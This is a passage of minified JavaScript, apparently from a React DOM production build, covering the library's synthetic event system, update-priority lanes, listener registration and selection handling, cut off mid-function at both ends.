i.dangerouslySetInnerHTML!="object"||!("__html"in i.dangerouslySetInnerHTML))throw Error(r(61))}if(i.style!=null&&typeof i.style!="object")throw Error(r(62))}}function cn(n,i){if(n.indexOf("-")===-1)return typeof i.is=="string";switch(n){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Mt=null;function Ho(n){return n=n.target||n.srcElement||window,n.correspondingUseElement&&(n=n.correspondingUseElement),n.nodeType===3?n.parentNode:n}var Uo=null,Br=null,Hr=null;function Uc(n){if(n=qi(n)){if(typeof Uo!="function")throw Error(r(280));var i=n.stateNode;i&&(i=gu(i),Uo(n.stateNode,n.type,i))}}function zc(n){Br?Hr?Hr.push(n):Hr=[n]:Br=n}function Wc(){if(Br){var n=Br,i=Hr;if(Hr=Br=null,Uc(n),i)for(n=0;n<i.length;n++)Uc(i[n])}}function jc(n,i){return n(i)}function Qc(){}var zo=!1;function Yc(n,i,u){if(zo)return n(i,u);zo=!0;try{return jc(n,i,u)}finally{zo=!1,(Br!==null||Hr!==null)&&(Qc(),Wc())}}function Ni(n,i){var u=n.stateNode;if(u===null)return null;var c=gu(u);if(c===null)return null;u=c[i];e:switch(i){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(c=!c.disabled)||(n=n.type,c=!(n==="button"||n==="input"||n==="select"||n==="textarea")),n=!c;break e;default:n=!1}if(n)return null;if(u&&typeof u!="function")throw Error(r(231,i,typeof u));return u}var Wo=!1;if(h)try{var vi={};Object.defineProperty(vi,"passive",{get:function(){Wo=!0}}),window.addEventListener("test",vi,vi),window.removeEventListener("test",vi,vi)}catch{Wo=!1}function f1(n,i,u,c,f,m,b,A,N){var U=Array.prototype.slice.call(arguments,3);try{i.apply(u,U)}catch($){this.onError($)}}var Ri=!1,Va=null,$a=!1,jo=null,h1={onError:function(n){Ri=!0,Va=n}};function p1(n,i,u,c,f,m,b,A,N){Ri=!1,Va=null,f1.apply(h1,arguments)}function m1(n,i,u,c,f,m,b,A,N){if(p1.apply(this,arguments),Ri){if(Ri){var U=Va;Ri=!1,Va=null}else throw Error(r(198));$a||($a=!0,jo=U)}}function hr(n){var i=n,u=n;if(n.alternate)for(;i.return;)i=i.return;else{n=i;do i=n,(i.flags&4098)!==0&&(u=i.return),n=i.return;while(n)}return i.tag===3?u:null}function Xc(n){if(n.tag===13){var i=n.memoizedState;if(i===null&&(n=n.alternate,n!==null&&(i=n.memoizedState)),i!==null)return i.dehydrated}return null}function Gc(n){if(hr(n)!==n)throw Error(r(188))}function g1(n){var i=n.alternate;if(!i){if(i=hr(n),i===null)throw Error(r(188));return i!==n?null:n}for(var u=n,c=i;;){var f=u.return;if(f===null)break;var m=f.alternate;if(m===null){if(c=f.return,c!==null){u=c;continue}break}if(f.child===m.child){for(m=f.child;m;){if(m===u)return Gc(f),n;if(m===c)return Gc(f),i;m=m.sibling}throw Error(r(188))}if(u.return!==c.return)u=f,c=m;else{for(var b=!1,A=f.child;A;){if(A===u){b=!0,u=f,c=m;break}if(A===c){b=!0,c=f,u=m;break}A=A.sibling}if(!b){for(A=m.child;A;){if(A===u){b=!0,u=m,c=f;break}if(A===c){b=!0,c=m,u=f;break}A=A.sibling}if(!b)throw Error(r(189))}}if(u.alternate!==c)throw Error(r(190))}if(u.tag!==3)throw Error(r(188));return u.stateNode.current===u?n:i}function Vc(n){return n=g1(n),n!==null?$c(n):null}function $c(n){if(n.tag===5||n.tag===6)return n;for(n=n.child;n!==null;){var i=$c(n);if(i!==null)return i;n=n.sibling}return null}var qc=t.unstable_scheduleCallback,Kc=t.unstable_cancelCallback,E1=t.unstable_shouldYield,T1=t.unstable_requestPaint,Ze=t.unstable_now,b1=t.unstable_getCurrentPriorityLevel,Qo=t.unstable_ImmediatePriority,Jc=t.unstable_UserBlockingPriority,qa=t.unstable_NormalPriority,_1=t.unstable_LowPriority,Zc=t.unstable_IdlePriority,Ka=null,dn=null;function S1(n){if(dn&&typeof dn.onCommitFiberRoot=="function")try{dn.onCommitFiberRoot(Ka,n,void 0,(n.current.flags&128)===128)}catch{}}var Zt=Math.clz32?Math.clz32:x1,y1=Math.log,C1=Math.LN2;function x1(n){return n>>>=0,n===0?32:31-(y1(n)/C1|0)|0}var Ja=64,Za=4194304;function Oi(n){switch(n&-n){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return n&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return n}}function eu(n,i){var u=n.pendingLanes;if(u===0)return 0;var c=0,f=n.suspendedLanes,m=n.pingedLanes,b=u&268435455;if(b!==0){var A=b&~f;A!==0?c=Oi(A):(m&=b,m!==0&&(c=Oi(m)))}else b=u&~f,b!==0?c=Oi(b):m!==0&&(c=Oi(m));if(c===0)return 0;if(i!==0&&i!==c&&(i&f)===0&&(f=c&-c,m=i&-i,f>=m||f===16&&(m&4194240)!==0))return i;if((c&4)!==0&&(c|=u&16),i=n.entangledLanes,i!==0)for(n=n.entanglements,i&=c;0<i;)u=31-Zt(i),f=1<<u,c|=n[u],i&=~f;return c}function A1(n,i){switch(n){case 1:case 2:case 4:return i+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return i+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function L1(n,i){for(var u=n.suspendedLanes,c=n.pingedLanes,f=n.expirationTimes,m=n.pendingLanes;0<m;){var b=31-Zt(m),A=1<<b,N=f[b];N===-1?((A&u)===0||(A&c)!==0)&&(f[b]=A1(A,i)):N<=i&&(n.expiredLanes|=A),m&=~A}}function Yo(n){return n=n.pendingLanes&-1073741825,n!==0?n:n&1073741824?1073741824:0}function ed(){var n=Ja;return Ja<<=1,(Ja&4194240)===0&&(Ja=64),n}function Xo(n){for(var i=[],u=0;31>u;u++)i.push(n);return i}function Pi(n,i,u){n.pendingLanes|=i,i!==536870912&&(n.suspendedLanes=0,n.pingedLanes=0),n=n.eventTimes,i=31-Zt(i),n[i]=u}function k1(n,i){var u=n.pendingLanes&~i;n.pendingLanes=i,n.suspendedLanes=0,n.pingedLanes=0,n.expiredLanes&=i,n.mutableReadLanes&=i,n.entangledLanes&=i,i=n.entanglements;var c=n.eventTimes;for(n=n.expirationTimes;0<u;){var f=31-Zt(u),m=1<<f;i[f]=0,c[f]=-1,n[f]=-1,u&=~m}}function Go(n,i){var u=n.entangledLanes|=i;for(n=n.entanglements;u;){var c=31-Zt(u),f=1<<c;f&i|n[c]&i&&(n[c]|=i),u&=~f}}var ze=0;function td(n){return n&=-n,1<n?4<n?(n&268435455)!==0?16:536870912:4:1}var nd,Vo,rd,id,ad,$o=!1,tu=[],Mn=null,Fn=null,Bn=null,wi=new Map,Di=new Map,Hn=[],I1="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function ud(n,i){switch(n){case"focusin":case"focusout":Mn=null;break;case"dragenter":case"dragleave":Fn=null;break;case"mouseover":case"mouseout":Bn=null;break;case"pointerover":case"pointerout":wi.delete(i.pointerId);break;case"gotpointercapture":case"lostpointercapture":Di.delete(i.pointerId)}}function Mi(n,i,u,c,f,m){return n===null||n.nativeEvent!==m?(n={blockedOn:i,domEventName:u,eventSystemFlags:c,nativeEvent:m,targetContainers:[f]},i!==null&&(i=qi(i),i!==null&&Vo(i)),n):(n.eventSystemFlags|=c,i=n.targetContainers,f!==null&&i.indexOf(f)===-1&&i.push(f),n)}function N1(n,i,u,c,f){switch(i){case"focusin":return Mn=Mi(Mn,n,i,u,c,f),!0;case"dragenter":return Fn=Mi(Fn,n,i,u,c,f),!0;case"mouseover":return Bn=Mi(Bn,n,i,u,c,f),!0;case"pointerover":var m=f.pointerId;return wi.set(m,Mi(wi.get(m)||null,n,i,u,c,f)),!0;case"gotpointercapture":return m=f.pointerId,Di.set(m,Mi(Di.get(m)||null,n,i,u,c,f)),!0}return!1}function od(n){var i=pr(n.target);if(i!==null){var u=hr(i);if(u!==null){if(i=u.tag,i===13){if(i=Xc(u),i!==null){n.blockedOn=i,ad(n.priority,function(){rd(u)});return}}else if(i===3&&u.stateNode.current.memoizedState.isDehydrated){n.blockedOn=u.tag===3?u.stateNode.containerInfo:null;return}}}n.blockedOn=null}function nu(n){if(n.blockedOn!==null)return!1;for(var i=n.targetContainers;0<i.length;){var u=Ko(n.domEventName,n.eventSystemFlags,i[0],n.nativeEvent);if(u===null){u=n.nativeEvent;var c=new u.constructor(u.type,u);Mt=c,u.target.dispatchEvent(c),Mt=null}else return i=qi(u),i!==null&&Vo(i),n.blockedOn=u,!1;i.shift()}return!0}function sd(n,i,u){nu(n)&&u.delete(i)}function v1(){$o=!1,Mn!==null&&nu(Mn)&&(Mn=null),Fn!==null&&nu(Fn)&&(Fn=null),Bn!==null&&nu(Bn)&&(Bn=null),wi.forEach(sd),Di.forEach(sd)}function Fi(n,i){n.blockedOn===i&&(n.blockedOn=null,$o||($o=!0,t.unstable_scheduleCallback(t.unstable_NormalPriority,v1)))}function Bi(n){function i(f){return Fi(f,n)}if(0<tu.length){Fi(tu[0],n);for(var u=1;u<tu.length;u++){var c=tu[u];c.blockedOn===n&&(c.blockedOn=null)}}for(Mn!==null&&Fi(Mn,n),Fn!==null&&Fi(Fn,n),Bn!==null&&Fi(Bn,n),wi.forEach(i),Di.forEach(i),u=0;u<Hn.length;u++)c=Hn[u],c.blockedOn===n&&(c.blockedOn=null);for(;0<Hn.length&&(u=Hn[0],u.blockedOn===null);)od(u),u.blockedOn===null&&Hn.shift()}var Ur=ie.ReactCurrentBatchConfig,ru=!0;function R1(n,i,u,c){var f=ze,m=Ur.transition;Ur.transition=null;try{ze=1,qo(n,i,u,c)}finally{ze=f,Ur.transition=m}}function O1(n,i,u,c){var f=ze,m=Ur.transition;Ur.transition=null;try{ze=4,qo(n,i,u,c)}finally{ze=f,Ur.transition=m}}function qo(n,i,u,c){if(ru){var f=Ko(n,i,u,c);if(f===null)ps(n,i,c,iu,u),ud(n,c);else if(N1(f,n,i,u,c))c.stopPropagation();else if(ud(n,c),i&4&&-1<I1.indexOf(n)){for(;f!==null;){var m=qi(f);if(m!==null&&nd(m),m=Ko(n,i,u,c),m===null&&ps(n,i,c,iu,u),m===f)break;f=m}f!==null&&c.stopPropagation()}else ps(n,i,c,null,u)}}var iu=null;function Ko(n,i,u,c){if(iu=null,n=Ho(c),n=pr(n),n!==null)if(i=hr(n),i===null)n=null;else if(u=i.tag,u===13){if(n=Xc(i),n!==null)return n;n=null}else if(u===3){if(i.stateNode.current.memoizedState.isDehydrated)return i.tag===3?i.stateNode.containerInfo:null;n=null}else i!==n&&(n=null);return iu=n,null}function ld(n){switch(n){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(b1()){case Qo:return 1;case Jc:return 4;case qa:case _1:return 16;case Zc:return 536870912;default:return 16}default:return 16}}var Un=null,Jo=null,au=null;function cd(){if(au)return au;var n,i=Jo,u=i.length,c,f="value"in Un?Un.value:Un.textContent,m=f.length;for(n=0;n<u&&i[n]===f[n];n++);var b=u-n;for(c=1;c<=b&&i[u-c]===f[m-c];c++);return au=f.slice(n,1<c?1-c:void 0)}function uu(n){var i=n.keyCode;return"charCode"in n?(n=n.charCode,n===0&&i===13&&(n=13)):n=i,n===10&&(n=13),32<=n||n===13?n:0}function ou(){return!0}function dd(){return!1}function Ft(n){function i(u,c,f,m,b){this._reactName=u,this._targetInst=f,this.type=c,this.nativeEvent=m,this.target=b,this.currentTarget=null;for(var A in n)n.hasOwnProperty(A)&&(u=n[A],this[A]=u?u(m):m[A]);return this.isDefaultPrevented=(m.defaultPrevented!=null?m.defaultPrevented:m.returnValue===!1)?ou:dd,this.isPropagationStopped=dd,this}return C(i.prototype,{preventDefault:function(){this.defaultPrevented=!0;var u=this.nativeEvent;u&&(u.preventDefault?u.preventDefault():typeof u.returnValue!="unknown"&&(u.returnValue=!1),this.isDefaultPrevented=ou)},stopPropagation:function(){var u=this.nativeEvent;u&&(u.stopPropagation?u.stopPropagation():typeof u.cancelBubble!="unknown"&&(u.cancelBubble=!0),this.isPropagationStopped=ou)},persist:function(){},isPersistent:ou}),i}var zr={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(n){return n.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Zo=Ft(zr),Hi=C({},zr,{view:0,detail:0}),P1=Ft(Hi),es,ts,Ui,su=C({},Hi,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:rs,button:0,buttons:0,relatedTarget:function(n){return n.relatedTarget===void 0?n.fromElement===n.srcElement?n.toElement:n.fromElement:n.relatedTarget},movementX:function(n){return"movementX"in n?n.movementX:(n!==Ui&&(Ui&&n.type==="mousemove"?(es=n.screenX-Ui.screenX,ts=n.screenY-Ui.screenY):ts=es=0,Ui=n),es)},movementY:function(n){return"movementY"in n?n.movementY:ts}}),fd=Ft(su),w1=C({},su,{dataTransfer:0}),D1=Ft(w1),M1=C({},Hi,{relatedTarget:0}),ns=Ft(M1),F1=C({},zr,{animationName:0,elapsedTime:0,pseudoElement:0}),B1=Ft(F1),H1=C({},zr,{clipboardData:function(n){return"clipboardData"in n?n.clipboardData:window.clipboardData}}),U1=Ft(H1),z1=C({},zr,{data:0}),hd=Ft(z1),W1={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},j1={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Q1={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Y1(n){var i=this.nativeEvent;return i.getModifierState?i.getModifierState(n):(n=Q1[n])?!!i[n]:!1}function rs(){return Y1}var X1=C({},Hi,{key:function(n){if(n.key){var i=W1[n.key]||n.key;if(i!=="Unidentified")return i}return n.type==="keypress"?(n=uu(n),n===13?"Enter":String.fromCharCode(n)):n.type==="keydown"||n.type==="keyup"?j1[n.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:rs,charCode:function(n){return n.type==="keypress"?uu(n):0},keyCode:function(n){return n.type==="keydown"||n.type==="keyup"?n.keyCode:0},which:function(n){return n.type==="keypress"?uu(n):n.type==="keydown"||n.type==="keyup"?n.keyCode:0}}),G1=Ft(X1),V1=C({},su,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),pd=Ft(V1),$1=C({},Hi,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:rs}),q1=Ft($1),K1=C({},zr,{propertyName:0,elapsedTime:0,pseudoElement:0}),J1=Ft(K1),Z1=C({},su,{deltaX:function(n){return"deltaX"in n?n.deltaX:"wheelDeltaX"in n?-n.wheelDeltaX:0},deltaY:function(n){return"deltaY"in n?n.deltaY:"wheelDeltaY"in n?-n.wheelDeltaY:"wheelDelta"in n?-n.wheelDelta:0},deltaZ:0,deltaMode:0}),eg=Ft(Z1),tg=[9,13,27,32],is=h&&"CompositionEvent"in window,zi=null;h&&"documentMode"in document&&(zi=document.documentMode);var ng=h&&"TextEvent"in window&&!zi,md=h&&(!is||zi&&8<zi&&11>=zi),gd=" ",Ed=!1;function Td(n,i){switch(n){case"keyup":return tg.indexOf(i.keyCode)!==-1;case"keydown":return i.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function bd(n){return n=n.detail,typeof n=="object"&&"data"in n?n.data:null}var Wr=!1;function rg(n,i){switch(n){case"compositionend":return bd(i);case"keypress":return i.which!==32?null:(Ed=!0,gd);case"textInput":return n=i.data,n===gd&&Ed?null:n;default:return null}}function ig(n,i){if(Wr)return n==="compositionend"||!is&&Td(n,i)?(n=cd(),au=Jo=Un=null,Wr=!1,n):null;switch(n){case"paste":return null;case"keypress":if(!(i.ctrlKey||i.altKey||i.metaKey)||i.ctrlKey&&i.altKey){if(i.char&&1<i.char.length)return i.char;if(i.which)return String.fromCharCode(i.which)}return null;case"compositionend":return md&&i.locale!=="ko"?null:i.data;default:return null}}var ag={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function _d(n){var i=n&&n.nodeName&&n.nodeName.toLowerCase();return i==="input"?!!ag[n.type]:i==="textarea"}function Sd(n,i,u,c){zc(c),i=hu(i,"onChange"),0<i.length&&(u=new Zo("onChange","change",null,u,c),n.push({event:u,listeners:i}))}var Wi=null,ji=null;function ug(n){Hd(n,0)}function lu(n){var i=Gr(n);if(ja(i))return n}function og(n,i){if(n==="change")return i}var yd=!1;if(h){var as;if(h){var us="oninput"in document;if(!us){var Cd=document.createElement("div");Cd.setAttribute("oninput","return;"),us=typeof Cd.oninput=="function"}as=us}else as=!1;yd=as&&(!document.documentMode||9<document.documentMode)}function xd(){Wi&&(Wi.detachEvent("onpropertychange",Ad),ji=Wi=null)}function Ad(n){if(n.propertyName==="value"&&lu(ji)){var i=[];Sd(i,ji,n,Ho(n)),Yc(ug,i)}}function sg(n,i,u){n==="focusin"?(xd(),Wi=i,ji=u,Wi.attachEvent("onpropertychange",Ad)):n==="focusout"&&xd()}function lg(n){if(n==="selectionchange"||n==="keyup"||n==="keydown")return lu(ji)}function cg(n,i){if(n==="click")return lu(i)}function dg(n,i){if(n==="input"||n==="change")return lu(i)}function fg(n,i){return n===i&&(n!==0||1/n===1/i)||n!==n&&i!==i}var en=typeof Object.is=="function"?Object.is:fg;function Qi(n,i){if(en(n,i))return!0;if(typeof n!="object"||n===null||typeof i!="object"||i===null)return!1;var u=Object.keys(n),c=Object.keys(i);if(u.length!==c.length)return!1;for(c=0;c<u.length;c++){var f=u[c];if(!p.call(i,f)||!en(n[f],i[f]))return!1}return!0}function Ld(n){for(;n&&n.firstChild;)n=n.firstChild;return n}function kd(n,i){var u=Ld(n);n=0;for(var c;u;){if(u.nodeType===3){if(c=n+u.textContent.length,n<=i&&c>=i)return{node:u,offset:i-n};n=c}e:{for(;u;){if(u.nextSibling){u=u.nextSibling;break e}u=u.parentNode}u=void 0}u=Ld(u)}}function Id(n,i){return n&&i?n===i?!0:n&&n.nodeType===3?!1:i&&i.nodeType===3?Id(n,i.parentNode):"contains"in n?n.contains(i):n.compareDocumentPosition?!!(n.compareDocumentPosition(i)&16):!1:!1}function Nd(){for(var n=window,i=Dr();i instanceof n.HTMLIFrameElement;){try{var u=typeof i.contentWindow.location.href=="string"}catch{u=!1}if(u)n=i.contentWindow;else break;i=Dr(n.document)}return i}function os(n){var i=n&&n.nodeName&&n.nodeName.toLowerCase();return i&&(i==="input"&&(n.type==="text"||n.type==="search"||n.type==="tel"||n.type==="url"||n.type==="password")||i==="textarea"||n.contentEditable==="true")}function hg(n){var i=Nd(),u=n.focusedElem,c=n.selectionRange;if(i!==u&&u&&u.ownerDocument&&Id(u.ownerDocument.documentElement,u)){if(c!==null&&os(u)){if(i=c.start,n=c.end,n===void 0&&(n=i),"selectionStart"in u)u.selectionStart=i,u.selectionEnd=Math.min(n,u.value.length);else if(n=(i=u.ownerDocument||document)&&i.defaultView||window,n.getSelection){n=n.getSelection();var f=u.textContent.length,m=Math.min(c.start,f);c=c.end===void 0?m:Math.min(c.end,f),!n.extend&&m>c&&(f=c,c=m,m=f),f=kd(u,m);var b=kd(u,c);f&&b&&(n.rangeCount!==1||n.anchorNode!==f.node||n.anchorOffset!==f.offset||n.focusNode!==b.node||n.focusOffset!==b.offset)&&(i=i.createRange(),i.setStart(f.node,f.offset),n.removeAllRanges(),m>c?(n.addRange(i),n.extend(b.node,b.offset)):(i.setEnd(b.node,b.offset),n.addRange(i)))}}for(i=[],n=u;n=n.parentNode;)n.nodeType===1&&i.push({element:n,left:n.scrollLeft,top:n.scrollTop});for(typeof u.focus=="function"&&u.focus(),u=0;u<i.length;u++)n=i[u],n.element.scrollLeft=n.left,n.element.scrollTop=n.top}}var pg=h&&"documentMode"in document&&11>=document.documentMode,jr=null,ss=null,Yi=null,ls=!1;function vd(n,i,u){var c=u.window===u?u.document:u.nodeType===9?u:u.ownerDocument;ls||jr==null||jr!==Dr(c)||(c=jr,"selectionStart"in c&&os(c)?c={start:c.selectionStart,end:c.selectionEnd}:(c=(c.ownerDocument&&c.ownerDocument.defaultView||window).getSelection(),c={anchorNode:c.anchorNode,anchorOffset:c.anchorOffset,focusNode:c.focusNode,focusOffset:c.focusOffset}),Yi&&Qi(Yi,c)||(Yi=c,c=hu(ss,"onSelect"),0<c.length&&(i=new Zo("onSelect","select",null,i,u),n.push({event:i,listeners:c}),i.target=jr)))}function cu(n,i){var u={};return u[n.toLowerCase()]=i.toLowerCase(),u["Webkit"+n]="webkit"+i,u["Moz"+n]="moz"+i,u}var Qr={animationend:cu("Animation","AnimationEnd"),animationiteration:cu("Animation","AnimationIteration"),animationstart:cu("Animation","AnimationStart"),transitionend:cu("Transition","TransitionEnd")},cs={},Rd={};h&&(Rd=document.createElement("div").style,"AnimationEvent"in window||(delete Qr.animationend.animation,delete Qr.animationiteration.animation,delete Qr.animationstart.animation),"TransitionEvent"in window||delete Qr.transitionend.transition);function du(n){if(cs[n])return cs[n];if(!Qr[n])return n;var i=Qr[n],u;for(u in i)if(i.hasOwnProperty(u)&&u in Rd)return cs[n]=i[u];return n}var Od=du("animationend"),Pd=du("animationiteration"),wd=du("animationstart"),Dd=du("transitionend"),Md=new Map,Fd="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function zn(n,i){Md.set(n,i),s(i,[n])}for(var ds=0;ds<Fd.length;ds++){var fs=Fd[ds],mg=fs.toLowerCase(),gg=fs[0].toUpperCase()+fs.slice(1);zn(mg,"on"+gg)}zn(Od,"onAnimationEnd"),zn(Pd,"onAnimationIteration"),zn(wd,"onAnimationStart"),zn("dblclick","onDoubleClick"),zn("focusin","onFocus"),zn("focusout","onBlur"),zn(Dd,"onTransitionEnd"),l("onMouseEnter",["mouseout","mouseover"]),l("onMouseLeave",["mouseout","mouseover"]),l("onPointerEnter",["pointerout","pointerover"]),l("onPointerLeave",["pointerout","pointerover"]),s("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),s("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),s("onBeforeInput",["compositionend","keypress","textInput","paste"]),s("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),s("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),s("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Xi="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Eg=new Set("cancel close invalid load scroll toggle".split(" ").concat(Xi));function Bd(n,i,u){var c=n.type||"unknown-event";n.currentTarget=u,m1(c,i,void 0,n),n.currentTarget=null}function Hd(n,i){i=(i&4)!==0;for(var u=0;u<n.length;u++){var c=n[u],f=c.event;c=c.listeners;e:{var m=void 0;if(i)for(var b=c.length-1;0<=b;b--){var A=c[b],N=A.instance,U=A.currentTarget;if(A=A.listener,N!==m&&f.isPropagationStopped())break e;Bd(f,A,U),m=N}else for(b=0;b<c.length;b++){if(A=c[b],N=A.instance,U=A.currentTarget,A=A.listener,N!==m&&f.isPropagationStopped())break e;Bd(f,A,U),m=N}}}if($a)throw n=jo,$a=!1,jo=null,n}function Ye(n,i){var u=i[_s];u===void 0&&(u=i[_s]=new Set);var c=n+"__bubble";u.has(c)||(Ud(i,n,2,!1),u.add(c))}function hs(n,i,u){var c=0;i&&(c|=4),Ud(u,n,c,i)}var fu="_reactListening"+Math.random().toString(36).slice(2);function Gi(n){if(!n[fu]){n[fu]=!0,a.forEach(function(u){u!=="selectionchange"&&(Eg.has(u)||hs(u,!1,n),hs(u,!0,n))});var i=n.nodeType===9?n:n.ownerDocument;i===null||i[fu]||(i[fu]=!0,hs("selectionchange",!1,i))}}function Ud(n,i,u,c){switch(ld(i)){case 1:var f=R1;break;case 4:f=O1;break;default:f=qo}u=f.bind(null,i,u,n),f=void 0,!Wo||i!=="touchstart"&&i!=="touchmove"&&i!=="wheel"||(f=!0),c?f!==void 0?n.addEventListener(i,u,{capture:!0,passive:f}):n.addEventListener(i,u,!0):f!==void 0?n.addEventListener(i,u,{passive:f}):n.addEventListener(i,u,!1)}function ps(n,i,u,c,f){var m=c;if((i&1)===0&&(i&2)===0&&c!==null)e:for(;;){if(c===null)return;var b=c.tag;if(b===3||b===4){var A=c.stateNode.containerInfo;if(A===f||A.nodeType===8&&A.parentNode===f)break;if(b===4)for(b=c.return;b!==null;){var N=b.tag;if((N===3||N===4)&&(N=b.stateNode.containerInfo,N===f||N.nodeType===8&&N.parentNode===f))return;b=b.return}for(;A!==null;){if(b=pr(A),b===null)return;if(N=b.tag,N===5||N===6){c=m=b;continue e}A=A.parentNode}}c=c.return}Yc(function(){var U=m,$=Ho(u),q=[];e:{var G=Md.get(n);if(G!==void 0){var ae=Zo,le=n;switch(n){case"keypress":if(uu(u)===0)break e;case"keydown":case"keyup":ae=G1;break;case"focusin":le="focus",ae=ns;break;case"focusout":le="blur",ae=ns;break;case"beforeblur":case"afterblur":ae=ns;break;case"click":if(u.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":ae=fd;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":ae=D1;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":ae=q1;break;case Od:case Pd:case wd:ae=B1;break;case Dd:ae=J1;break;case"scroll":ae=P1;break;case"wheel":ae=eg;break;case"copy":case"cut":case"paste":ae=U1;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":ae=pd}var fe=(i&4)!==0,et=!fe&&n==="scroll",D=fe?G!==null?G+"Capture":null:G;fe=[];for(var R=U,B;R!==null;){B=R;var Z=B.stateNode;if(B.tag===5&&Z!==null&&(B=Z,D!==null&&(Z=Ni(R,D),Z!=null&&fe.push(Vi(R,Z,B)))),et)break;R=R.return}0<fe.length&&(G=new ae(G,le,null,u,$),q.push({event:G,listeners:fe}))}}if((i&7)===0){e:{if(G=n==="mouseover"||n==="pointerover",ae=n==="mouseout"||n==="pointerout",G&&u!==Mt&&(le=u.relatedTarget||u.fromElement)&&(pr(le)||le[yn]))break 